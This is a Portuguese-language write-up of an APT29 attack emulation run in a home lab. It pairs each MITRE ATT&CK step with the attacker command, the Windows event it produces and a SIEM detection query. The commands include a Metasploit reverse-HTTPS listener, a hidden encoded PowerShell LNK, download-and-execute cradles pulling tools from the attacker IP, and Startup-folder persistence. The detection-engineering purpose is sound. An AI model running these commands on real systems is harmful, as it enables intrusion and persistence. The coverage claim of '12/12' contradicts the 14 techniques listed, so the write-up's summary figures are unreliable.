# Timeline do Ataque APT29 — Cozy Bear

> Esta timeline documenta a sequência real de técnicas executadas durante a emulação do APT29 neste laboratório. Cada fase representa uma etapa do ciclo de ataque com o TTP correspondente no MITRE ATT&CK, o comando executado, o evento gerado no Windows e a evidência capturada pelo SIEM.

---

## Visão Geral do Ataque

```
Fase 1          Fase 2          Fase 3          Fase 4          Fase 5
Initial    -->  Execution  -->  Defense    -->  Discovery  -->  Collection
Access          + C2            Evasion                         + Persistence
T1566.002       T1059.001       T1027           T1087           T1560
T1204.002       T1218.011       T1071.001       T1069           T1547.009
                                                T1082           T1105
                                                T1057
                                                T1012
```

O ataque começa com um link malicioso enviado à vítima que descarrega um ficheiro LNK. Ao abrir o ficheiro, o PowerShell executa um payload ofuscado que estabelece uma sessão Meterpreter com o Kali-Attack. A partir daí o atacante realiza reconhecimento do ambiente, comprime dados sensíveis e instala persistência na pasta Startup para sobreviver a reboots.

---

## Fase 1 — Initial Access

### T1566.002 — Spearphishing Link

O atacante envia um link malicioso que força o download de um ficheiro LNK através do Microsoft Edge. A vítima vê um ficheiro aparentemente legítimo mas que contém um comando PowerShell escondido.

**Comando executado no Kali:**
```bash
./auto-lnk.sh
python3 -m http.server 8080
```

**Evento gerado:**
```
EventID: 11 (Sysmon FileCreate)
TargetFilename: C:\Users\Administrator\Downloads\ds7002.lnk
Image: msedge.exe
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*msedge* OR data.win.eventdata.image:*msedge*
```

**Evidência:**

![T1566.002 - Spearphishing Download](evidence/01-spearphishing-download.png)

---

### T1204.002 — Malicious File (LNK)

A vítima clica no ficheiro LNK. O Windows executa o comando escondido dentro do shortcut que invoca o PowerShell com parâmetros de evasão.

**Conteúdo do LNK:**
```
Target: C:\Windows\System32\cmd.exe
Arguments: /c powershell.exe -ep bypass -w hidden -e <BASE64_PAYLOAD>
```

**Evento gerado:**
```
EventID: 1 (Sysmon ProcessCreate)
Image: C:\Windows\System32\cmd.exe
CommandLine: /c powershell.exe -ep bypass -w hidden -e <encoded>
ParentImage: explorer.exe
```

**Evidência:**

> Adicionar print: ficheiro LNK na pasta Downloads do WIN-DC01

![T1204.002 - Malicious LNK File](evidence/02-malicious-lnk.png)

---

## Fase 2 — Execution e Command and Control

### T1059.001 — PowerShell Execution

O PowerShell executa o payload que estabelece a ligação reversa com o listener Metasploit no Kali-Attack. A sessão Meterpreter fica activa como `LAB\Administrator`.

**Listener no Kali:**
```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST 192.168.10.102; \
  set LPORT 443; \
  run -j"
```

**Evento gerado:**
```
EventID: 4103 (PowerShell Module Logging)
EventID: 4104 (PowerShell Script Block Logging)
ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString(...)
```

**Evidência:**

![T1059.001 - Meterpreter Session](evidence/03-meterpreter-session.png)

---

### T1071.001 — C2 via HTTPS porta 443

A comunicação entre o Meterpreter e o Kali usa HTTPS na porta 443 para parecer tráfego legítimo e evadir firewalls que bloqueiam portas não standard.

**Evento gerado:**
```
EventID: 3 (Sysmon NetworkConnect)
DestinationPort: 443
Image: powershell.exe
DestinationIp: 192.168.10.102
```

---

### T1027 — Obfuscation

O payload é codificado em Base64 com o parâmetro `-EncodedCommand` e usa `-ExecutionPolicy Bypass` para contornar as políticas de execução do PowerShell.

**Comando:**
```powershell
powershell.exe -ep bypass -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
```

**Evento gerado:**
```
EventID: 4104 (Script Block Logging)
ScriptBlockText: contém o payload decodificado
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*hidden* OR
data.win.eventdata.commandLine:*encodedcommand* OR
data.win.eventdata.commandLine:*-enc*
```

**Evidência:**

![T1027 - Obfuscation Alert](evidence/05-obfuscation-alert.png)

---

### T1218.011 — Rundll32

O Rundll32 é usado para executar código malicioso de forma a parecer uma operação legítima do sistema.

**Comando:**
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...
```

**Evento gerado:**
```
EventID: 1 (Sysmon ProcessCreate)
Image: C:\Windows\System32\rundll32.exe
```

**Evidência:**

> Adicionar print: alerta no Kibana do T1218.011 com o campo image mostrando rundll32.exe

![T1218.011 - Rundll32 Alert](evidence/06-rundll32-alert.png)

---

## Fase 3 — Discovery

Com a sessão Meterpreter activa, o atacante realiza reconhecimento do ambiente para perceber onde está, quem são os utilizadores e quais os processos em execução.

### T1087 — Account Discovery

```powershell
net user
net user /domain
```

**Utilizadores descobertos no lab:**
```
r.anderson    m.torres    s.connor
svc.backup    madAdmin    Administrator
```

**Evidência:**

> Adicionar print: output do net user na shell Meterpreter mostrando os utilizadores do domínio

![T1087 - Account Discovery](evidence/07-account-discovery.png)

---

### T1069 — Permission Groups Discovery

```powershell
net group "Domain Admins" /domain
```

**Evidência:**

> Adicionar print: output do net group na shell Meterpreter

![T1069 - Permission Groups](evidence/08-permission-groups.png)

---

### T1082 — System Information Discovery

```powershell
systeminfo
```

**Output relevante:**
```
OS Name: Microsoft Windows Server 2022
Domain: lab.local
Logon Server: \\WIN-DC01
```

**Evidência:**

> Adicionar print: output do systeminfo na shell Meterpreter

![T1082 - System Info](evidence/09-system-info.png)

---

### T1057 — Process Discovery

```powershell
tasklist
```

**Evidência:**

> Adicionar print: output do tasklist na shell Meterpreter

![T1057 - Process Discovery](evidence/10-process-discovery.png)

---

### T1012 — Registry Query

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
```

**Evidência:**

> Adicionar print: output do reg query na shell Meterpreter

![T1012 - Registry Query](evidence/11-registry-query.png)

---

## Fase 4 — Collection e Persistence

### T1560 — Archive Collected Data

```powershell
7z a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*
```

**Evidência:**

> Adicionar print: comando 7z a executar na shell Meterpreter + ficheiro zip criado

![T1560 - Archive Data](evidence/12-archive-data.png)

---

### T1105 — Ingress Tool Transfer

```powershell
Invoke-WebRequest -Uri "http://192.168.10.102:8080/tool.exe" `
  -OutFile "C:\Users\Public\tool.exe"
```

**Evidência:**

> Adicionar print: alerta no Kibana do T1105 com o Invoke-WebRequest no commandLine

![T1105 - Tool Transfer](evidence/13-tool-transfer.png)

---

### T1547.009 — Startup Folder Persistence

```powershell
Copy-Item "C:\Users\Public\payload.lnk" `
  "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**Evidência:**

> Adicionar print: ficheiro LNK na pasta Startup do WIN-DC01 + alerta no Kibana

![T1547.009 - Startup Persistence](evidence/14-startup-persistence.png)

---

## Resultados da Emulação

| TTP | Técnica | Fase | Severity | Detectado |
|---|---|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access | High | ✅ |
| T1204.002 | Malicious File LNK | Initial Access | High | ✅ |
| T1059.001 | PowerShell Execution | Execution | High | ✅ |
| T1071.001 | C2 HTTPS | Command and Control | High | ✅ |
| T1027 | Obfuscation | Defense Evasion | High | ✅ |
| T1218.011 | Rundll32 | Defense Evasion | High | ✅ |
| T1087 | Account Discovery | Discovery | Medium | ✅ |
| T1069 | Permission Groups | Discovery | Medium | ✅ |
| T1082 | System Info | Discovery | Medium | ✅ |
| T1057 | Process Discovery | Discovery | Medium | ✅ |
| T1012 | Registry Query | Discovery | Medium | ✅ |
| T1560 | Archive Data | Collection | High | ✅ |
| T1105 | Tool Transfer | Command and Control | High | ✅ |
| T1547.009 | Startup Persistence | Persistence | High | ✅ |

**Coverage total: 12/12 TTPs detectados — 100%**

---

## Evidências SIEM — Kibana

Esta secção agrega as evidências globais capturadas no Kibana após a execução completa do ataque.

**Security Alerts — 188 alertas gerados**

> Adicionar print: Security -> Alerts no Kibana mostrando os 188 alertas com severity high e medium

![Kibana Security Alerts](evidence/15-kibana-alerts.png)

**Detection Rules — 12 regras activas**

> Adicionar print: Security -> Rules mostrando as 12 regras APT29 com status Succeeded

![Kibana Detection Rules](evidence/16-kibana-rules.png)

**APT29 SOC Dashboard**

> Adicionar print: Dashboard completo com gauge, bar chart, timeline, treemap e tabela

![APT29 SOC Dashboard](evidence/17-soc-dashboard.png)

**Alerta detalhado — exemplo T1059.001**

> Adicionar print: alerta aberto no Kibana mostrando todos os campos: timestamp, rule name, host, commandLine, severity

![Alert Detail T1059.001](evidence/18-alert-detail.png)

---

## Como adicionar as evidências ao repositório

No GitHub, dentro da pasta `adversaries/APT29-Cozy-Bear/02-attack-phases/`, cria uma pasta chamada `evidence` e faz upload dos prints com os nomes exactos indicados acima. O GitHub vai renderizar as imagens automaticamente dentro do ficheiro MD.

```
02-attack-phases/
├── attack-timeline.md
├── attack-timeline-en.md
└── evidence/
    ├── 01-spearphishing-download.png
    ├── 02-malicious-lnk.png
    ├── 03-meterpreter-session.png
    ├── 04-c2-https.png
    ├── 05-obfuscation-alert.png
    ├── 06-rundll32-alert.png
    ├── 07-account-discovery.png
    ├── 08-permission-groups.png
    ├── 09-system-info.png
    ├── 10-process-discovery.png
    ├── 11-registry-query.png
    ├── 12-archive-data.png
    ├── 13-tool-transfer.png
    ├── 14-startup-persistence.png
    ├── 15-kibana-alerts.png
    ├── 16-kibana-rules.png
    ├── 17-soc-dashboard.png
    └── 18-alert-detail.png
```

---

## Referências MITRE ATT&CK

- [APT29 Group Page](https://attack.mitre.org/groups/G0016/)
- [T1566.002 Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
- [T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [T1027 Obfuscated Files](https://attack.mitre.org/techniques/T1027/)
- [T1218.011 Rundll32](https://attack.mitre.org/techniques/T1218/011/)
- [T1087 Account Discovery](https://attack.mitre.org/techniques/T1087/)
- [T1560 Archive Collected Data](https://attack.mitre.org/techniques/T1560/)
- [T1547.009 Shortcut Modification](https://attack.mitre.org/techniques/T1547/009/)
- [T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
